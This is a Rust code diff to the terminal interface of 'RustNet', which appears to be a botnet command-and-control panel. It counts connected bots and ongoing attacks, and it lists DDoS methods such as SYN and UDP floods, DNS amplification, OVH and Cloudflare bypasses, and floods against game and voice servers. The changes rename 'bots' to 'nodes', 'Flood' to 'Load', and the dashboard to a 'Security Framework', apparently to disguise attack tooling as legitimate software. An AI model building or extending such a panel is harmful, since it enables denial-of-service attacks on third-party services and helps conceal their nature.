@@ -26,12 +26,12 @@ pub async fn render_status_bar(client: &Arc<Client>, state: &Arc<AppState>) -> R
         format!("{}m", minutes)
     };
     let status_right = format!(
-        "\x1b[38;5;39m[B:\x1b[38;5;51m{}\x1b[38;5;39m][U:\x1b[38;5;51m{}\x1b[38;5;39m][A:\x1b[38;5;51m{}/{}\x1b[38;5;39m][Up:\x1b[38;5;51m{}\x1b[38;5;39m]\x1b[0m",
+        "\x1b[38;5;39m[N:\x1b[38;5;51m{}\x1b[38;5;39m][U:\x1b[38;5;51m{}\x1b[38;5;39m][A:\x1b[38;5;51m{}/{}\x1b[38;5;39m][Up:\x1b[38;5;51m{}\x1b[38;5;39m]\x1b[0m",
         bot_count, client_count, attack_count, max_attacks, uptime_str
     );
     let breadcrumb_display = format!("\x1b[38;5;51m→ {}\x1b[0m", breadcrumb);
     let breadcrumb_len = breadcrumb.len() + 2; 
-    let status_len = format!("[B:{}][U:{}][A:{}/{}][Up:{}]", bot_count, client_count, attack_count, max_attacks, uptime_str).len();
+    let status_len = format!("[N:{}][U:{}][A:{}/{}][Up:{}]", bot_count, client_count, attack_count, max_attacks, uptime_str).len();
     let padding = if breadcrumb_len + status_len + 1 < width {
         width - breadcrumb_len - status_len
     } else {
@@ -56,16 +56,19 @@ pub async fn show_prompt(client: &Arc<Client>, state: &Arc<AppState>) -> Result<
 }
 pub async fn handle_help_command(client: &Arc<Client>, state: &Arc<AppState>) -> Result<()> {
     client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
-    let title = apply_ice_gradient("Help Menu");
+    let title = apply_ice_gradient("Command Reference");
     client.write(format!("\n\r  {}\n\r", title).as_bytes()).await?;
     client.write("  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r".as_bytes()).await?;
     let commands = [
-        ("help", "Show this help menu"),
+        ("help", "Show this reference"),
+        ("attack", "Launch an attack"),
         ("methods", "Show attack methods"),
-        ("stats", "Show server statistics"),
-        ("online", "Show online users"),
+        ("ongoing", "Show ongoing attacks"),
+        ("stop", "Stop an attack"),
+        ("stats", "Show system metrics"),
+        ("online", "Show active sessions"),
         ("whoami", "Show your information"),
-        ("rules", "Show server rules"),
+        ("rules", "Show usage policy"),
         ("version", "Show server version"),
         ("dashboard", "Show main dashboard"),
         ("uptime", "Show server uptime"),
@@ -80,14 +83,14 @@ pub async fn handle_help_command(client: &Arc<Client>, state: &Arc<AppState>) ->
     let user_level = client.user.get_level();
     if user_level >= Level::Admin {
         client.write(b"\n\r").await?;
-        let admin_title = apply_ice_gradient("Admin Commands");
+        let admin_title = apply_ice_gradient("Administrative Controls");
         client.write(format!("  {}\n\r", admin_title).as_bytes()).await?;
         client.write("  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r".as_bytes()).await?;
         let admin_cmds = [
             ("users", "Manage users"),
-            ("bots", "Manage bots"),
-            ("broadcast", "Send message to all users"),
-            ("kick", "Kick a user")
+            ("nodes", "Manage nodes"),
+            ("broadcast", "Send system alert"),
+            ("disconnect", "Disconnect a user")
         ];
         for (cmd, desc) in admin_cmds.iter() {
             let cmd_gradient = apply_gradient(cmd, 196, 202);
@@ -104,17 +107,17 @@ pub async fn handle_stats_command(client: &Arc<Client>, state: &Arc<AppState>) -
     let client_count = state.client_manager.get_client_count().await;
     let attack_count = state.attack_manager.get_active_count().await;
     client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
-    let title = apply_ice_gradient("Server Statistics");
+    let title = apply_ice_gradient("System Metrics");
     client.write(format!("\n\r  {}\n\r", title).as_bytes()).await?;
     client.write("  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r".as_bytes()).await?;
     let bot_gradient = apply_gradient(&bot_count.to_string(), 39, 51);
-    client.write(format!("  \x1b[38;5;245mBots Connected  : \x1b[0m{}\n\r", bot_gradient).as_bytes()).await?;
+    client.write(format!("  \x1b[38;5;245mNodes Connected : \x1b[0m{}\n\r", bot_gradient).as_bytes()).await?;
     let client_gradient = apply_gradient(&client_count.to_string(), 39, 51);
     client.write(format!("  \x1b[38;5;245mUsers Connected : \x1b[0m{}\n\r", client_gradient).as_bytes()).await?;
     let attack_gradient = apply_fire_gradient(&format!("{}/{}", attack_count, state.config.read().await.max_attacks));
-    client.write(format!("  \x1b[38;5;245mActive Attacks  : \x1b[0m{}\n\r", attack_gradient).as_bytes()).await?;
+    client.write(format!("  \x1b[38;5;245mOngoing Attacks : \x1b[0m{}\n\r", attack_gradient).as_bytes()).await?;
     client.write(b"\n\r").await?;
-    client.set_breadcrumb("Home > Server Stats").await;
+    client.set_breadcrumb("Home > System Metrics").await;
     Ok(())
 }
 pub async fn handle_health_command(client: &Arc<Client>, state: &Arc<AppState>) -> Result<()> {
@@ -137,11 +140,11 @@ pub async fn handle_health_command(client: &Arc<Client>, state: &Arc<AppState>) 
     let uptime_gradient = apply_gradient(&uptime_str, 39, 51);
     client.write(format!("  \x1b[38;5;245mSystem Uptime   : \x1b[0m{}\n\r", uptime_gradient).as_bytes()).await?;
     let bots_gradient = apply_gradient(&bot_count.to_string(), 39, 51);
-    client.write(format!("  \x1b[38;5;245mBots Online     : \x1b[0m{}\n\r", bots_gradient).as_bytes()).await?;
+    client.write(format!("  \x1b[38;5;245mNodes Online    : \x1b[0m{}\n\r", bots_gradient).as_bytes()).await?;
     let clients_gradient = apply_gradient(&client_count.to_string(), 39, 51);
     client.write(format!("  \x1b[38;5;245mClients Online  : \x1b[0m{}\n\r", clients_gradient).as_bytes()).await?;
     let attacks_gradient = apply_gradient(&attack_count.to_string(), 39, 51);
-    client.write(format!("  \x1b[38;5;245mActive Attacks  : \x1b[0m{}\n\r", attacks_gradient).as_bytes()).await?;
+    client.write(format!("  \x1b[38;5;245mOngoing Attacks : \x1b[0m{}\n\r", attacks_gradient).as_bytes()).await?;
     client.write(b"\n\r").await?;
     client.set_breadcrumb("Home > Health Check").await;
     Ok(())
@@ -149,11 +152,11 @@ pub async fn handle_health_command(client: &Arc<Client>, state: &Arc<AppState>) 
 pub async fn handle_online_command(client: &Arc<Client>, state: &Arc<AppState>) -> Result<()> {
     let clients = state.client_manager.get_all_clients().await;
     client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
-    let title = apply_ice_gradient("Online Users");
+    let title = apply_ice_gradient("Active Sessions");
     client.write(format!("\n\r  {}\n\r", title).as_bytes()).await?;
     client.write("  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r".as_bytes()).await?;
     if clients.is_empty() {
-        client.write(b"  \x1b[38;5;245mNo users online\x1b[0m\n\r").await?;
+        client.write(b"  \x1b[38;5;245mNo active sessions\x1b[0m\n\r").await?;
     } else {
         for c in clients.iter() {
             let level_color = match c.user.get_level() {
@@ -171,9 +174,9 @@ pub async fn handle_online_command(client: &Arc<Client>, state: &Arc<AppState>) 
         }
     }
     client.write("  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r".as_bytes()).await?;
-    client.write(format!("  \x1b[38;5;245mTotal Users: \x1b[38;5;39m{}\x1b[0m\n\r", clients.len()).as_bytes()).await?;
+    client.write(format!("  \x1b[38;5;245mTotal Sessions: \x1b[38;5;39m{}\x1b[0m\n\r", clients.len()).as_bytes()).await?;
     client.write(b"\n\r").await?;
-    client.set_breadcrumb("Home > Online Users").await;
+    client.set_breadcrumb("Home > Active Sessions").await;
     Ok(())
 }
 pub async fn handle_whoami_command(client: &Arc<Client>, _state: &Arc<AppState>) -> Result<()> {
@@ -301,47 +304,47 @@ pub async fn handle_methods_command(client: &Arc<Client>, state: &Arc<AppState>)
     client.write(format!("\n\r  {}\n\r", title).as_bytes()).await?;
     client.write("  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r".as_bytes()).await?;
     let l4_methods = [
-        ("UDP", "UDP Flood"),
-        ("UDPMAX", "UDP Max Flood (MTU)"),
-        ("TCP", "TCP Flood"),
-        ("SYN", "SYN Flood"),
-        ("ACK", "ACK Flood"),
-        ("ICMP", "ICMP Flood"),
-        ("GRE", "GRE Flood"),
+        ("UDP", "UDP Load"),
+        ("UDPMAX", "UDP Max Load (MTU)"),
+        ("TCP", "TCP Load"),
+        ("SYN", "SYN Load"),
+        ("ACK", "ACK Load"),
+        ("ICMP", "ICMP Load"),
+        ("GRE", "GRE Load"),
         ("CONNECTION", "TCP Connection Exhaustion"),
         ("VSE", "Valve Source Engine"),
         ("OVH", "OVH Bypass")
     ];
     let l7_methods = [
-        ("HTTP", "HTTP Flood"),
-        ("CF-BYPASS", "Cloudflare Bypass"),
+        ("HTTP", "HTTP Load"),
+        ("UA-HTTP", "HTTP UA Bypass"),
         ("SLOWLORIS", "Slowloris Attack"),
         ("STRESS", "HTTP Stress Test"),
-        ("DNS", "DNS Flood"),
-        ("WEBSOCKET", "WebSocket Flood"),
-        ("TLS", "SSL/TLS Flood"),
+        ("DNS", "DNS Load"),
+        ("WEBSOCKET", "WebSocket Load"),
+        ("TLS", "SSL/TLS Load"),
         ("AMPLIFICATION", "DNS Amplification")
     ];
     let game_methods = [
-        ("MINECRAFT", "Minecraft Server Flood"),
-        ("RAKNET", "RakNet Flood (MCPE/Terraria)"),
-        ("FIVEM", "FiveM Server Flood"),
-        ("TS3", "TeamSpeak 3 Flood"),
-        ("DISCORD", "Discord Voice Flood"),
-        ("SIP", "SIP VOIP Flood")
+        ("MINECRAFT", "Minecraft Server Load"),
+        ("RAKNET", "RakNet Load (MCPE/Terraria)"),
+        ("FIVEM", "FiveM Server Load"),
+        ("TS3", "TeamSpeak 3 Load"),
+        ("DISCORD", "Discord Voice Load"),
+        ("SIP", "SIP VOIP Load")
     ];
-    client.write(b"  \x1b[38;5;39mLayer 4 Methods\x1b[0m\n\r").await?;
+    client.write(b"  \x1b[38;5;39mLayer 4 Vectors\x1b[0m\n\r").await?;
     for (name, desc) in l4_methods.iter() {
         let name_gradient = apply_gradient(name, 39, 51);
         client.write(format!("  \x1b[38;5;245m{:<12} : \x1b[0m{}\n\r", name_gradient, desc).as_bytes()).await?;
     }
-    let l7_title = apply_fire_gradient("Layer 7 Methods");
+    let l7_title = apply_fire_gradient("Layer 7 Vectors");
     client.write(format!("\n\r  {}\n\r", l7_title).as_bytes()).await?;
     for (name, desc) in l7_methods.iter() {
         let name_gradient = apply_gradient(name, 196, 220);
         client.write(format!("  \x1b[38;5;245m{:<12} : \x1b[0m{}\n\r", name_gradient, desc).as_bytes()).await?;
     }
-    let game_title = apply_gradient("Game Methods", 220, 226);
+    let game_title = apply_gradient("Application Specific Vectors", 220, 226);
     client.write(format!("\n\r  {}\n\r", game_title).as_bytes()).await?;
     for (name, desc) in game_methods.iter() {
         let name_gradient = apply_gradient(name, 220, 226);
@@ -363,7 +366,7 @@ pub async fn handle_dashboard_command(client: &Arc<Client>, state: &Arc<AppState
     let hours = (uptime.as_secs() % 86400) / 3600;
     let minutes = (uptime.as_secs() % 3600) / 60;
     client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
-    let title = apply_ice_gradient("RustNet Dashboard");
+    let title = apply_ice_gradient("RustNet Security Framework");
     client.write(format!("\n\r  {}\n\r", title).as_bytes()).await?;
     client.write("  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r".as_bytes()).await?;
     let status = if bot_count > 0 && client_count > 0 { 
@@ -376,17 +379,17 @@ pub async fn handle_dashboard_command(client: &Arc<Client>, state: &Arc<AppState
     let uptime_gradient = apply_gradient(&uptime_str, 39, 51);
     client.write(format!("  \x1b[38;5;245mSystem Uptime   : \x1b[0m{}\n\r", uptime_gradient).as_bytes()).await?;
     let bots_gradient = apply_gradient(&format!("{}/{}", bot_count, state.config.read().await.max_bot_connections), 39, 51);
-    client.write(format!("  \x1b[38;5;245mConnected Bots  : \x1b[0m{}\n\r", bots_gradient).as_bytes()).await?;
+    client.write(format!("  \x1b[38;5;245mConnected Nodes : \x1b[0m{}\n\r", bots_gradient).as_bytes()).await?;
     let users_gradient = apply_gradient(&format!("{}/{}", client_count, state.config.read().await.max_user_connections), 39, 51);
     client.write(format!("  \x1b[38;5;245mConnected Users : \x1b[0m{}\n\r", users_gradient).as_bytes()).await?;
     let attacks_gradient = apply_fire_gradient(&format!("{}/{}", attack_count, state.config.read().await.max_attacks));
-    client.write(format!("  \x1b[38;5;245mActive Attacks  : \x1b[0m{}\n\r", attacks_gradient).as_bytes()).await?;
+    client.write(format!("  \x1b[38;5;245mOngoing Attacks : \x1b[0m{}\n\r", attacks_gradient).as_bytes()).await?;
     client.write(b"\n\r").await?;
-    let active_title = apply_fire_gradient("Active Attacks");
+    let active_title = apply_fire_gradient("Ongoing Attacks");
     client.write(format!("  {}\n\r", active_title).as_bytes()).await?;
     client.write("  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r".as_bytes()).await?;
     if attacks.is_empty() {
-        client.write(b"  \x1b[38;5;245mNo active attacks running\x1b[0m\n\r").await?;
+        client.write(b"  \x1b[38;5;245mNo ongoing attacks running\x1b[0m\n\r").await?;
     } else {
         for attack in attacks.iter().take(5) {
             let remaining = attack.remaining_duration().as_secs();
@@ -412,7 +415,7 @@ pub async fn handle_dashboard_command(client: &Arc<Client>, state: &Arc<AppState
     client.write(format!("  {}\n\r", user_title).as_bytes()).await?;
     client.write("  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r".as_bytes()).await?;
     let user_attacks_gradient = apply_fire_gradient(&user_attacks.len().to_string());
-    client.write(format!("  \x1b[38;5;245mYour Active Attacks : \x1b[0m{}\n\r", user_attacks_gradient).as_bytes()).await?;
+    client.write(format!("  \x1b[38;5;245mYour Ongoing Attacks: \x1b[0m{}\n\r", user_attacks_gradient).as_bytes()).await?;
     client.write(b"\n\r").await?;
     Ok(())
 }
@@ -432,7 +435,7 @@ pub async fn handle_version_command(client: &Arc<Client>, _state: &Arc<AppState>
 }
 pub async fn handle_rules_command(client: &Arc<Client>, _state: &Arc<AppState>) -> Result<()> {
     client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
-    let title = apply_ice_gradient("Server Rules");
+    let title = apply_ice_gradient("Usage Policy");
     client.write(format!("\n\r  {}\n\r", title).as_bytes()).await?;
     client.write("  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r".as_bytes()).await?;
     let rules = [
@@ -448,6 +451,6 @@ pub async fn handle_rules_command(client: &Arc<Client>, _state: &Arc<AppState>) 
         client.write(format!("  {} {}\n\r", index_gradient, rule_gradient).as_bytes()).await?;
     }
     client.write(b"\n\r").await?;
-    client.set_breadcrumb("Home > Rules").await;
+    client.set_breadcrumb("Home > Usage Policy").await;
     Ok(())
 }
